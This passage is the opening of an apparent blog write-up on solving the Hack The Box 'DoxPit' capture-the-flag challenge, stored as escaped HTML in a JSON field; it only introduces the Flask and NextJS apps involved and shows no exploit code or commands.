walk you through the process of solving the HTB DoxPit challenge\u003c/p\u003e\n\u003cp\u003eThis challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, I’ll show you how to exploit these vulnerabilities and successfully capture the flag\u003c/p\u003e\n\u003cp\u003eLet’s dive into the details!\u003c/p\u003e\n\u003ch1 id=\"getting-started\"\u003eGetting Started\u003c/h1\u003e\n\u003cp\u003eThe first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.\u003c/p\u003e","title":"Solving DoxPit Challenge"}]